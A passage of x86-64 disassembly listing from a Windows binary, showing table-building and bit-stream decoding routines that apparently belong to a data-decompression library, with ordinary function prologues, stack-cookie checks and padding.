   140002468:	83 c2 38             	add    $0x38,%edx
   14000246b:	83 e2 1f             	and    $0x1f,%edx
   14000246e:	44 8b 03             	mov    (%rbx),%r8d
   140002471:	8b ca                	mov    %edx,%ecx
   140002473:	41 d3 e8             	shr    %cl,%r8d
   140002476:	41 8b c0             	mov    %r8d,%eax
   140002479:	f7 d0                	not    %eax
   14000247b:	0f ba e8 1f          	bts    $0x1f,%eax
   14000247f:	44 0f bc c8          	bsf    %eax,%r9d
   140002483:	41 d1 e9             	shr    $1,%r9d
   140002486:	41 83 f9 0c          	cmp    $0xc,%r9d
   14000248a:	73 c4                	jae    0x140002450
   14000248c:	43 8d 0c 09          	lea    (%r9,%r9,1),%ecx
   140002490:	41 d3 e8             	shr    %cl,%r8d
   140002493:	47 8d 14 4a          	lea    (%r10,%r9,2),%r10d
   140002497:	41 83 e0 03          	and    $0x3,%r8d
   14000249b:	45 03 d1             	add    %r9d,%r10d
   14000249e:	45 03 d0             	add    %r8d,%r10d
   1400024a1:	44 8d 04 11          	lea    (%rcx,%rdx,1),%r8d
   1400024a5:	41 8d 50 02          	lea    0x2(%r8),%edx
   1400024a9:	45 3b d5             	cmp    %r13d,%r10d
   1400024ac:	0f 83 0c 01 00 00    	jae    0x1400025be
   1400024b2:	49 3b de             	cmp    %r14,%rbx
   1400024b5:	76 25                	jbe    0x1400024dc
   1400024b7:	8b c2                	mov    %edx,%eax
   1400024b9:	c1 f8 03             	sar    $0x3,%eax
   1400024bc:	48 63 c8             	movslq %eax,%rcx
   1400024bf:	48 03 cb             	add    %rbx,%rcx
   1400024c2:	48 3b ce             	cmp    %rsi,%rcx
   1400024c5:	76 15                	jbe    0x1400024dc
   1400024c7:	41 2b df             	sub    %r15d,%ebx
   1400024ca:	8d 14 dd 22 00 00 00 	lea    0x22(,%rbx,8),%edx
   1400024d1:	48 8b de             	mov    %rsi,%rbx
   1400024d4:	41 03 d0             	add    %r8d,%edx
   1400024d7:	83 e2 1f             	and    $0x1f,%edx
   1400024da:	eb 0d                	jmp    0x1400024e9
   1400024dc:	48 63 c2             	movslq %edx,%rax
   1400024df:	48 c1 f8 03          	sar    $0x3,%rax
   1400024e3:	48 03 d8             	add    %rax,%rbx
   1400024e6:	83 e2 07             	and    $0x7,%edx
   1400024e9:	44 8b 03             	mov    (%rbx),%r8d
   1400024ec:	8b ca                	mov    %edx,%ecx
   1400024ee:	41 d3 e8             	shr    %cl,%r8d
   1400024f1:	03 54 24 34          	add    0x34(%rsp),%edx
   1400024f5:	47 8d 0c 24          	lea    (%r12,%r12,1),%r9d
   1400024f9:	41 8b f9             	mov    %r9d,%edi
   1400024fc:	41 8d 4c 24 ff       	lea    -0x1(%r12),%ecx
   140002501:	41 2b fb             	sub    %r11d,%edi
   140002504:	41 23 c8             	and    %r8d,%ecx
   140002507:	ff cf                	dec    %edi
   140002509:	3b cf                	cmp    %edi,%ecx
   14000250b:	73 04                	jae    0x140002511
   14000250d:	ff ca                	dec    %edx
   14000250f:	eb 11                	jmp    0x140002522
   140002511:	41 8d 41 ff          	lea    -0x1(%r9),%eax
   140002515:	41 23 c0             	and    %r8d,%eax
   140002518:	8b c8                	mov    %eax,%ecx
   14000251a:	2b cf                	sub    %edi,%ecx
   14000251c:	41 3b c4             	cmp    %r12d,%eax
   14000251f:	0f 4c c8             	cmovl  %eax,%ecx
   140002522:	44 8d 41 ff          	lea    -0x1(%rcx),%r8d
   140002526:	45 85 c0             	test   %r8d,%r8d
   140002529:	78 05                	js     0x140002530
   14000252b:	45 2b d8             	sub    %r8d,%r11d
   14000252e:	eb 06                	jmp    0x140002536
   140002530:	41 ff cb             	dec    %r11d
   140002533:	44 03 d9             	add    %ecx,%r11d
   140002536:	4c 8b 4c 24 38       	mov    0x38(%rsp),%r9
   14000253b:	41 8b c2             	mov    %r10d,%eax
   14000253e:	41 ff c2             	inc    %r10d
   140002541:	83 f9 01             	cmp    $0x1,%ecx
   140002544:	66 45 89 04 41       	mov    %r8w,(%r9,%rax,2)
   140002549:	44 8b cd             	mov    %ebp,%r9d
   14000254c:	41 0f 94 c1          	sete   %r9b
   140002550:	45 3b dc             	cmp    %r12d,%r11d
   140002553:	7d 1c                	jge    0x140002571
   140002555:	41 83 fb 01          	cmp    $0x1,%r11d
   140002559:	7e 67                	jle    0x1400025c2
   14000255b:	41 0f bd c3          	bsr    %r11d,%eax
   14000255f:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   140002565:	8b c8                	mov    %eax,%ecx
   140002567:	41 d3 e4             	shl    %cl,%r12d
   14000256a:	8d 78 01             	lea    0x1(%rax),%edi
   14000256d:	89 7c 24 34          	mov    %edi,0x34(%rsp)
   140002571:	45 3b d5             	cmp    %r13d,%r10d
   140002574:	73 48                	jae    0x1400025be
   140002576:	49 3b de             	cmp    %r14,%rbx
   140002579:	76 29                	jbe    0x1400025a4
   14000257b:	8b c2                	mov    %edx,%eax
   14000257d:	c1 f8 03             	sar    $0x3,%eax
   140002580:	48 63 c8             	movslq %eax,%rcx
   140002583:	48 03 cb             	add    %rbx,%rcx
   140002586:	48 3b ce             	cmp    %rsi,%rcx
   140002589:	76 19                	jbe    0x1400025a4
   14000258b:	41 2b df             	sub    %r15d,%ebx
   14000258e:	8d 14 da             	lea    (%rdx,%rbx,8),%edx
   140002591:	48 8b de             	mov    %rsi,%rbx
   140002594:	83 e2 1f             	and    $0x1f,%edx
   140002597:	8b ca                	mov    %edx,%ecx
   140002599:	44 8b 03             	mov    (%rbx),%r8d
   14000259c:	41 d3 e8             	shr    %cl,%r8d
   14000259f:	e9 8c fe ff ff       	jmp    0x140002430
   1400025a4:	48 63 c2             	movslq %edx,%rax
   1400025a7:	83 e2 07             	and    $0x7,%edx
   1400025aa:	48 c1 f8 03          	sar    $0x3,%rax
   1400025ae:	8b ca                	mov    %edx,%ecx
   1400025b0:	48 03 d8             	add    %rax,%rbx
   1400025b3:	44 8b 03             	mov    (%rbx),%r8d
   1400025b6:	41 d3 e8             	shr    %cl,%r8d
   1400025b9:	e9 72 fe ff ff       	jmp    0x140002430
   1400025be:	41 83 fb 01          	cmp    $0x1,%r11d
   1400025c2:	75 13                	jne    0x1400025d7
   1400025c4:	45 3b d5             	cmp    %r13d,%r10d
   1400025c7:	76 09                	jbe    0x1400025d2
   1400025c9:	48 c7 c0 d0 ff ff ff 	mov    $0xffffffffffffffd0,%rax
   1400025d0:	eb 29                	jmp    0x1400025fb
   1400025d2:	83 fa 20             	cmp    $0x20,%edx
   1400025d5:	7e 09                	jle    0x1400025e0
   1400025d7:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   1400025de:	eb 1b                	jmp    0x1400025fb
   1400025e0:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400025e5:	41 8d 42 ff          	lea    -0x1(%r10),%eax
   1400025e9:	89 01                	mov    %eax,(%rcx)
   1400025eb:	8d 42 07             	lea    0x7(%rdx),%eax
   1400025ee:	c1 f8 03             	sar    $0x3,%eax
   1400025f1:	48 98                	cltq
   1400025f3:	48 2b 44 24 48       	sub    0x48(%rsp),%rax
   1400025f8:	48 03 c3             	add    %rbx,%rax
   1400025fb:	4c 8b 6c 24 68       	mov    0x68(%rsp),%r13
   140002600:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   140002605:	48 33 cc             	xor    %rsp,%rcx
   140002608:	e8 13 a0 00 00       	call   0x14000c620
   14000260d:	48 83 c4 70          	add    $0x70,%rsp
   140002611:	41 5f                	pop    %r15
   140002613:	41 5e                	pop    %r14
   140002615:	41 5c                	pop    %r12
   140002617:	5f                   	pop    %rdi
   140002618:	5e                   	pop    %rsi
   140002619:	5d                   	pop    %rbp
   14000261a:	5b                   	pop    %rbx
   14000261b:	c3                   	ret
   14000261c:	cc                   	int3
   14000261d:	cc                   	int3
   14000261e:	cc                   	int3
   14000261f:	cc                   	int3
   140002620:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002625:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000262a:	41 56                	push   %r14
   14000262c:	48 83 ec 40          	sub    $0x40,%rsp
   140002630:	48 8b d9             	mov    %rcx,%rbx
   140002633:	4d 8b f1             	mov    %r9,%r14
   140002636:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   14000263d:	00 
   14000263e:	49 8b f8             	mov    %r8,%rdi
   140002641:	48 85 c9             	test   %rcx,%rcx
   140002644:	75 18                	jne    0x14000265e
   140002646:	48 c7 c0 b8 ff ff ff 	mov    $0xffffffffffffffb8,%rax
   14000264d:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140002652:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   140002657:	48 83 c4 40          	add    $0x40,%rsp
   14000265b:	41 5e                	pop    %r14
   14000265d:	c3                   	ret
   14000265e:	4c 8b 54 24 78       	mov    0x78(%rsp),%r10
   140002663:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   140002668:	45 0f b6 0a          	movzbl (%r10),%r9d
   14000266c:	41 80 f9 80          	cmp    $0x80,%r9b
   140002670:	72 61                	jb     0x1400026d3
   140002672:	49 8d 71 82          	lea    -0x7e(%r9),%rsi
   140002676:	48 d1 ee             	shr    $1,%rsi
   140002679:	48 8d 46 01          	lea    0x1(%rsi),%rax
   14000267d:	48 3b c1             	cmp    %rcx,%rax
   140002680:	77 5a                	ja     0x1400026dc
   140002682:	49 8d 41 81          	lea    -0x7f(%r9),%rax
   140002686:	48 3d 00 01 00 00    	cmp    $0x100,%rax
   14000268c:	0f 83 62 01 00 00    	jae    0x1400027f4
   140002692:	45 33 c9             	xor    %r9d,%r9d
   140002695:	48 85 c0             	test   %rax,%rax
   140002698:	74 74                	je     0x14000270e
   14000269a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400026a0:	45 8b c1             	mov    %r9d,%r8d
   1400026a3:	49 d1 e8             	shr    $1,%r8
   1400026a6:	43 0f b6 4c 02 01    	movzbl 0x1(%r10,%r8,1),%ecx
   1400026ac:	c0 e9 04             	shr    $0x4,%cl
   1400026af:	42 88 0c 0b          	mov    %cl,(%rbx,%r9,1)
   1400026b3:	41 8d 49 01          	lea    0x1(%r9),%ecx
   1400026b7:	47 0f b6 44 02 01    	movzbl 0x1(%r10,%r8,1),%r8d
   1400026bd:	41 83 c1 02          	add    $0x2,%r9d
   1400026c1:	41 80 e0 0f          	and    $0xf,%r8b
   1400026c5:	44 88 04 0b          	mov    %r8b,(%rbx,%rcx,1)
   1400026c9:	41 8b c9             	mov    %r9d,%ecx
   1400026cc:	48 3b c8             	cmp    %rax,%rcx
   1400026cf:	72 cf                	jb     0x1400026a0
   1400026d1:	eb 3b                	jmp    0x14000270e
   1400026d3:	49 8d 41 01          	lea    0x1(%r9),%rax
   1400026d7:	48 3b c1             	cmp    %rcx,%rax
   1400026da:	76 0c                	jbe    0x1400026e8
   1400026dc:	48 c7 c0 b8 ff ff ff 	mov    $0xffffffffffffffb8,%rax
   1400026e3:	e9 13 01 00 00       	jmp    0x1400027fb
   1400026e8:	48 8b 84 24 88 00 00 	mov    0x88(%rsp),%rax
   1400026ef:	00 
   1400026f0:	4d 8d 42 01          	lea    0x1(%r10),%r8
   1400026f4:	48 8b cb             	mov    %rbx,%rcx
   1400026f7:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400026fc:	49 8b f1             	mov    %r9,%rsi
   1400026ff:	e8 4c ef ff ff       	call   0x140001650
   140002704:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140002708:	0f 87 ed 00 00 00    	ja     0x1400027fb
   14000270e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002711:	33 c9                	xor    %ecx,%ecx
   140002713:	0f 11 07             	movups %xmm0,(%rdi)
   140002716:	45 33 c9             	xor    %r9d,%r9d
   140002719:	45 33 c0             	xor    %r8d,%r8d
   14000271c:	0f 11 47 10          	movups %xmm0,0x10(%rdi)
   140002720:	0f 11 47 20          	movups %xmm0,0x20(%rdi)
   140002724:	89 4f 30             	mov    %ecx,0x30(%rdi)
   140002727:	48 85 c0             	test   %rax,%rax
   14000272a:	0f 84 c4 00 00 00    	je     0x1400027f4
   140002730:	41 ba 01 00 00 00    	mov    $0x1,%r10d
   140002736:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000273d:	00 00 00 
   140002740:	42 0f b6 14 03       	movzbl (%rbx,%r8,1),%edx
   140002745:	80 fa 0c             	cmp    $0xc,%dl
   140002748:	0f 83 a6 00 00 00    	jae    0x1400027f4
   14000274e:	ff 04 97             	incl   (%rdi,%rdx,4)
   140002751:	41 8b d2             	mov    %r10d,%edx
   140002754:	42 0f b6 0c 03       	movzbl (%rbx,%r8,1),%ecx
   140002759:	41 ff c0             	inc    %r8d
   14000275c:	d3 e2                	shl    %cl,%edx
   14000275e:	d1 fa                	sar    $1,%edx
   140002760:	44 03 ca             	add    %edx,%r9d
   140002763:	41 8b c8             	mov    %r8d,%ecx
   140002766:	48 3b c8             	cmp    %rax,%rcx
   140002769:	72 d5                	jb     0x140002740
   14000276b:	45 85 c9             	test   %r9d,%r9d
   14000276e:	0f 84 80 00 00 00    	je     0x1400027f4
   140002774:	41 0f bd c9          	bsr    %r9d,%ecx
   140002778:	c7 84 24 98 00 00 00 	movl   $0x0,0x98(%rsp)
   14000277f:	00 00 00 00 
   140002783:	ff c1                	inc    %ecx
   140002785:	83 f9 0c             	cmp    $0xc,%ecx
   140002788:	77 6a                	ja     0x1400027f4
   14000278a:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   14000278f:	45 8b c2             	mov    %r10d,%r8d
   140002792:	41 d3 e0             	shl    %cl,%r8d
   140002795:	45 2b c1             	sub    %r9d,%r8d
   140002798:	c7 84 24 98 00 00 00 	movl   $0x0,0x98(%rsp)
   14000279f:	00 00 00 00 
   1400027a3:	41 b9 00 00 00 00    	mov    $0x0,%r9d
   1400027a9:	c7 84 24 98 00 00 00 	movl   $0x0,0x98(%rsp)
   1400027b0:	00 00 00 00 
   1400027b4:	89 0a                	mov    %ecx,(%rdx)
   1400027b6:	41 0f bd c8          	bsr    %r8d,%ecx
   1400027ba:	44 0f 45 c9          	cmovne %ecx,%r9d
   1400027be:	b9 00 00 00 00       	mov    $0x0,%ecx
   1400027c3:	41 0f bd d0          	bsr    %r8d,%edx
   1400027c7:	0f 45 ca             	cmovne %edx,%ecx
   1400027ca:	41 d3 e2             	shl    %cl,%r10d
   1400027cd:	45 3b d0             	cmp    %r8d,%r10d
   1400027d0:	75 22                	jne    0x1400027f4
   1400027d2:	41 8d 49 01          	lea    0x1(%r9),%ecx
   1400027d6:	88 0c 18             	mov    %cl,(%rax,%rbx,1)
   1400027d9:	ff 04 8f             	incl   (%rdi,%rcx,4)
   1400027dc:	8b 4f 04             	mov    0x4(%rdi),%ecx
   1400027df:	83 f9 02             	cmp    $0x2,%ecx
   1400027e2:	72 10                	jb     0x1400027f4
   1400027e4:	f6 c1 01             	test   $0x1,%cl
   1400027e7:	75 0b                	jne    0x1400027f4
   1400027e9:	ff c0                	inc    %eax
   1400027eb:	41 89 06             	mov    %eax,(%r14)
   1400027ee:	48 8d 46 01          	lea    0x1(%rsi),%rax
   1400027f2:	eb 07                	jmp    0x1400027fb
   1400027f4:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   1400027fb:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140002800:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   140002805:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   14000280a:	48 83 c4 40          	add    $0x40,%rsp
   14000280e:	41 5e                	pop    %r14
   140002810:	c3                   	ret
   140002811:	cc                   	int3
   140002812:	cc                   	int3
   140002813:	cc                   	int3
   140002814:	cc                   	int3
   140002815:	cc                   	int3
   140002816:	cc                   	int3
   140002817:	cc                   	int3
   140002818:	cc                   	int3
   140002819:	cc                   	int3
   14000281a:	cc                   	int3
   14000281b:	cc                   	int3
   14000281c:	cc                   	int3
   14000281d:	cc                   	int3
   14000281e:	cc                   	int3
   14000281f:	cc                   	int3
   140002820:	4c 8b dc             	mov    %rsp,%r11
   140002823:	53                   	push   %rbx
   140002824:	56                   	push   %rsi
   140002825:	41 56                	push   %r14
   140002827:	48 83 ec 70          	sub    $0x70,%rsp
   14000282b:	49 8d 81 80 00 00 00 	lea    0x80(%r9),%rax
   140002832:	4d 8b f1             	mov    %r9,%r14
   140002835:	49 89 43 b0          	mov    %rax,-0x50(%r11)
   140002839:	48 8b d9             	mov    %rcx,%rbx
   14000283c:	4d 89 43 a8          	mov    %r8,-0x58(%r11)
   140002840:	49 8d 43 08          	lea    0x8(%r11),%rax
   140002844:	33 f6                	xor    %esi,%esi
   140002846:	49 89 53 a0          	mov    %rdx,-0x60(%r11)
   14000284a:	49 8d 89 e4 02 00 00 	lea    0x2e4(%r9),%rcx
   140002851:	49 89 43 98          	mov    %rax,-0x68(%r11)
   140002855:	4d 8b c6             	mov    %r14,%r8
   140002858:	41 89 73 08          	mov    %esi,0x8(%r11)
   14000285c:	4d 8d 4b 20          	lea    0x20(%r11),%r9
   140002860:	41 89 73 20          	mov    %esi,0x20(%r11)
   140002864:	e8 b7 fd ff ff       	call   0x140002620
   140002869:	48 89 84 24 b0 00 00 	mov    %rax,0xb0(%rsp)
   140002870:	00 
   140002871:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140002875:	0f 87 92 02 00 00    	ja     0x140002b0d
   14000287b:	8b 03                	mov    (%rbx),%eax
   14000287d:	0f b6 c8             	movzbl %al,%ecx
   140002880:	ff c1                	inc    %ecx
   140002882:	48 89 7c 24 68       	mov    %rdi,0x68(%rsp)
   140002887:	8b bc 24 90 00 00 00 	mov    0x90(%rsp),%edi
   14000288e:	89 84 24 b8 00 00 00 	mov    %eax,0xb8(%rsp)
   140002895:	3b f9                	cmp    %ecx,%edi
   140002897:	76 15                	jbe    0x1400028ae
   140002899:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   14000289e:	48 c7 c0 d4 ff ff ff 	mov    $0xffffffffffffffd4,%rax
   1400028a5:	48 83 c4 70          	add    $0x70,%rsp
   1400028a9:	41 5e                	pop    %r14
   1400028ab:	5e                   	pop    %rsi
   1400028ac:	5b                   	pop    %rbx
   1400028ad:	c3                   	ret
   1400028ae:	44 8b 94 24 a8 00 00 	mov    0xa8(%rsp),%r10d
   1400028b5:	00 
   1400028b6:	44 8b c6             	mov    %esi,%r8d
   1400028b9:	48 89 ac 24 98 00 00 	mov    %rbp,0x98(%rsp)
   1400028c0:	00 
   1400028c1:	8b d6                	mov    %esi,%edx
   1400028c3:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   1400028c8:	4c 89 6c 24 58       	mov    %r13,0x58(%rsp)
   1400028cd:	44 8d 6f 01          	lea    0x1(%rdi),%r13d
   1400028d1:	40 88 b4 24 b9 00 00 	mov    %sil,0xb9(%rsp)
   1400028d8:	00 
   1400028d9:	45 8d 5a fd          	lea    -0x3(%r10),%r11d
   1400028dd:	40 88 bc 24 ba 00 00 	mov    %dil,0xba(%rsp)
   1400028e4:	00 
   1400028e5:	8b 84 24 b8 00 00 00 	mov    0xb8(%rsp),%eax
   1400028ec:	4c 89 7c 24 50       	mov    %r15,0x50(%rsp)
   1400028f1:	89 03                	mov    %eax,(%rbx)
   1400028f3:	44 89 ac 24 b8 00 00 	mov    %r13d,0xb8(%rsp)
   1400028fa:	00 
   1400028fb:	45 85 ed             	test   %r13d,%r13d
   1400028fe:	7e 15                	jle    0x140002915
   140002900:	8b c2                	mov    %edx,%eax
   140002902:	41 8b c8             	mov    %r8d,%ecx
   140002905:	ff c2                	inc    %edx
   140002907:	45 03 04 86          	add    (%r14,%rax,4),%r8d
   14000290b:	41 89 4c 86 40       	mov    %ecx,0x40(%r14,%rax,4)
   140002910:	41 3b d5             	cmp    %r13d,%edx
   140002913:	7c eb                	jl     0x140002900
   140002915:	45 33 c9             	xor    %r9d,%r9d
   140002918:	45 85 db             	test   %r11d,%r11d
   14000291b:	0f 8e 88 00 00 00    	jle    0x1400029a9
   140002921:	4d 63 c1             	movslq %r9d,%r8
   140002924:	43 0f b6 8c 06 e4 02 	movzbl 0x2e4(%r14,%r8,1),%ecx
   14000292b:	00 00 
   14000292d:	41 8b 44 8e 40       	mov    0x40(%r14,%rcx,4),%eax
   140002932:	45 88 8c 06 e4 01 00 	mov    %r9b,0x1e4(%r14,%rax,1)
   140002939:	00 
   14000293a:	41 ff 44 8e 40       	incl   0x40(%r14,%rcx,4)
   14000293f:	41 8d 49 01          	lea    0x1(%r9),%ecx
   140002943:	43 0f b6 94 06 e5 02 	movzbl 0x2e5(%r14,%r8,1),%edx
   14000294a:	00 00 
   14000294c:	41 8b 44 96 40       	mov    0x40(%r14,%rdx,4),%eax
   140002951:	41 88 8c 06 e4 01 00 	mov    %cl,0x1e4(%r14,%rax,1)
   140002958:	00 
   140002959:	41 8d 49 02          	lea    0x2(%r9),%ecx
   14000295d:	41 ff 44 96 40       	incl   0x40(%r14,%rdx,4)
   140002962:	43 0f b6 94 06 e6 02 	movzbl 0x2e6(%r14,%r8,1),%edx
   140002969:	00 00 
   14000296b:	41 8b 44 96 40       	mov    0x40(%r14,%rdx,4),%eax
   140002970:	41 88 8c 06 e4 01 00 	mov    %cl,0x1e4(%r14,%rax,1)
   140002977:	00 
   140002978:	41 8d 49 03          	lea    0x3(%r9),%ecx
   14000297c:	41 ff 44 96 40       	incl   0x40(%r14,%rdx,4)
   140002981:	41 83 c1 04          	add    $0x4,%r9d
   140002985:	43 0f b6 94 06 e7 02 	movzbl 0x2e7(%r14,%r8,1),%edx
   14000298c:	00 00 
   14000298e:	41 8b 44 96 40       	mov    0x40(%r14,%rdx,4),%eax
   140002993:	41 88 8c 06 e4 01 00 	mov    %cl,0x1e4(%r14,%rax,1)
   14000299a:	00 
   14000299b:	41 ff 44 96 40       	incl   0x40(%r14,%rdx,4)
   1400029a0:	45 3b cb             	cmp    %r11d,%r9d
   1400029a3:	0f 8c 78 ff ff ff    	jl     0x140002921
   1400029a9:	45 3b ca             	cmp    %r10d,%r9d
   1400029ac:	7d 28                	jge    0x1400029d6
   1400029ae:	66 90                	xchg   %ax,%ax
   1400029b0:	49 63 c1             	movslq %r9d,%rax
   1400029b3:	41 0f b6 8c 06 e4 02 	movzbl 0x2e4(%r14,%rax,1),%ecx
   1400029ba:	00 00 
   1400029bc:	41 8b 44 8e 40       	mov    0x40(%r14,%rcx,4),%eax
   1400029c1:	45 88 8c 06 e4 01 00 	mov    %r9b,0x1e4(%r14,%rax,1)
   1400029c8:	00 
   1400029c9:	41 ff c1             	inc    %r9d
   1400029cc:	41 ff 44 8e 40       	incl   0x40(%r14,%rcx,4)
   1400029d1:	45 3b ca             	cmp    %r10d,%r9d
   1400029d4:	7c da                	jl     0x1400029b0
   1400029d6:	41 8b 2e             	mov    (%r14),%ebp
   1400029d9:	45 33 e4             	xor    %r12d,%r12d
   1400029dc:	41 bf 01 00 00 00    	mov    $0x1,%r15d
   1400029e2:	45 3b ef             	cmp    %r15d,%r13d
   1400029e5:	0f 86 fe 00 00 00    	jbe    0x140002ae9
   1400029eb:	48 be 01 00 01 00 01 	movabs $0x1000100010001,%rsi
   1400029f2:	00 01 00 
   1400029f5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1400029fc:	00 00 00 00 
   140002a00:	41 8b cf             	mov    %r15d,%ecx
   140002a03:	41 8b c7             	mov    %r15d,%eax
   140002a06:	41 2a ff             	sub    %r15b,%dil
   140002a09:	41 ba 01 00 00 00    	mov    $0x1,%r10d
   140002a0f:	41 d3 e2             	shl    %cl,%r10d
   140002a12:	40 fe c7             	inc    %dil
   140002a15:	41 d1 fa             	sar    $1,%r10d
   140002a18:	45 8b cc             	mov    %r12d,%r9d
   140002a1b:	45 8b 1c 86          	mov    (%r14,%rax,4),%r11d
   140002a1f:	41 8b ca             	mov    %r10d,%ecx
   140002a22:	83 e9 01             	sub    $0x1,%ecx
   140002a25:	0f 84 c9 01 00 00    	je     0x140002bf4
   140002a2b:	83 e9 01             	sub    $0x1,%ecx
   140002a2e:	0f 84 7c 01 00 00    	je     0x140002bb0
   140002a34:	83 e9 02             	sub    $0x2,%ecx
   140002a37:	0f 84 28 01 00 00    	je     0x140002b65
   140002a3d:	83 f9 04             	cmp    $0x4,%ecx
   140002a40:	0f 84 d0 00 00 00    	je     0x140002b16
   140002a46:	33 f6                	xor    %esi,%esi
   140002a48:	45 85 db             	test   %r11d,%r11d
   140002a4b:	7e 75                	jle    0x140002ac2
   140002a4d:	40 0f b6 ff          	movzbl %dil,%edi
   140002a51:	49 bd 01 00 01 00 01 	movabs $0x1000100010001,%r13
   140002a58:	00 01 00 
   140002a5b:	48 c1 e7 08          	shl    $0x8,%rdi
   140002a5f:	90                   	nop
   140002a60:	8d 04 2e             	lea    (%rsi,%rbp,1),%eax
   140002a63:	45 33 c0             	xor    %r8d,%r8d
   140002a66:	48 63 c8             	movslq %eax,%rcx
   140002a69:	41 0f b6 84 0e e4 01 	movzbl 0x1e4(%r14,%rcx,1),%eax
   140002a70:	00 00 
   140002a72:	48 0b c7             	or     %rdi,%rax
   140002a75:	49 0f af c5          	imul   %r13,%rax
   140002a79:	45 85 d2             	test   %r10d,%r10d
   140002a7c:	7e 32                	jle    0x140002ab0
   140002a7e:	49 63 c9             	movslq %r9d,%rcx
   140002a81:	48 8d 14 4b          	lea    (%rbx,%rcx,2),%rdx
   140002a85:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   140002a8c:	00 00 00 00 
   140002a90:	49 63 c8             	movslq %r8d,%rcx
   140002a93:	41 83 c0 10          	add    $0x10,%r8d
   140002a97:	48 89 44 4a 04       	mov    %rax,0x4(%rdx,%rcx,2)
   140002a9c:	48 89 44 4a 0c       	mov    %rax,0xc(%rdx,%rcx,2)
   140002aa1:	48 89 44 4a 14       	mov    %rax,0x14(%rdx,%rcx,2)
   140002aa6:	48 89 44 4a 1c       	mov    %rax,0x1c(%rdx,%rcx,2)
   140002aab:	45 3b c2             	cmp    %r10d,%r8d
   140002aae:	7c e0                	jl     0x140002a90
   140002ab0:	45 03 ca             	add    %r10d,%r9d
   140002ab3:	ff c6                	inc    %esi
   140002ab5:	41 3b f3             	cmp    %r11d,%esi
   140002ab8:	7c a6                	jl     0x140002a60
   140002aba:	44 8b ac 24 b8 00 00 	mov    0xb8(%rsp),%r13d
   140002ac1:	00 
   140002ac2:	48 be 01 00 01 00 01 	movabs $0x1000100010001,%rsi
   140002ac9:	00 01 00 
   140002acc:	8b bc 24 90 00 00 00 	mov    0x90(%rsp),%edi
   140002ad3:	41 03 eb             	add    %r11d,%ebp
   140002ad6:	45 0f af d3          	imul   %r11d,%r10d
   140002ada:	41 ff c7             	inc    %r15d
   140002add:	45 03 e2             	add    %r10d,%r12d
   140002ae0:	45 3b fd             	cmp    %r13d,%r15d
   140002ae3:	0f 82 17 ff ff ff    	jb     0x140002a00
   140002ae9:	48 8b 84 24 b0 00 00 	mov    0xb0(%rsp),%rax
   140002af0:	00 
   140002af1:	4c 8b 7c 24 50       	mov    0x50(%rsp),%r15
   140002af6:	4c 8b 6c 24 58       	mov    0x58(%rsp),%r13
   140002afb:	4c 8b 64 24 60       	mov    0x60(%rsp),%r12
   140002b00:	48 8b ac 24 98 00 00 	mov    0x98(%rsp),%rbp
   140002b07:	00 
   140002b08:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   140002b0d:	48 83 c4 70          	add    $0x70,%rsp
   140002b11:	41 5e                	pop    %r14
   140002b13:	5e                   	pop    %rsi
   140002b14:	5b                   	pop    %rbx
   140002b15:	c3                   	ret
   140002b16:	45 33 c0             	xor    %r8d,%r8d
   140002b19:	45 85 db             	test   %r11d,%r11d
   140002b1c:	7e ae                	jle    0x140002acc
   140002b1e:	40 0f b6 ff          	movzbl %dil,%edi
   140002b22:	48 c1 e7 08          	shl    $0x8,%rdi
   140002b26:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140002b2d:	00 00 00 
   140002b30:	41 8d 04 28          	lea    (%r8,%rbp,1),%eax
   140002b34:	41 ff c0             	inc    %r8d
   140002b37:	48 63 c8             	movslq %eax,%rcx
   140002b3a:	49 63 c1             	movslq %r9d,%rax
   140002b3d:	41 83 c1 08          	add    $0x8,%r9d
   140002b41:	41 0f b6 94 0e e4 01 	movzbl 0x1e4(%r14,%rcx,1),%edx
   140002b48:	00 00 
   140002b4a:	48 0b d7             	or     %rdi,%rdx
   140002b4d:	48 0f af d6          	imul   %rsi,%rdx
   140002b51:	48 89 54 43 04       	mov    %rdx,0x4(%rbx,%rax,2)
   140002b56:	48 89 54 43 0c       	mov    %rdx,0xc(%rbx,%rax,2)
   140002b5b:	45 3b c3             	cmp    %r11d,%r8d
   140002b5e:	7c d0                	jl     0x140002b30
   140002b60:	e9 67 ff ff ff       	jmp    0x140002acc
   140002b65:	45 33 c0             	xor    %r8d,%r8d
   140002b68:	45 85 db             	test   %r11d,%r11d
   140002b6b:	0f 8e 5b ff ff ff    	jle    0x140002acc
   140002b71:	40 0f b6 ff          	movzbl %dil,%edi
   140002b75:	48 c1 e7 08          	shl    $0x8,%rdi
   140002b79:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002b80:	41 8d 04 28          	lea    (%r8,%rbp,1),%eax
   140002b84:	41 ff c0             	inc    %r8d
   140002b87:	48 63 c8             	movslq %eax,%rcx
   140002b8a:	49 63 c1             	movslq %r9d,%rax
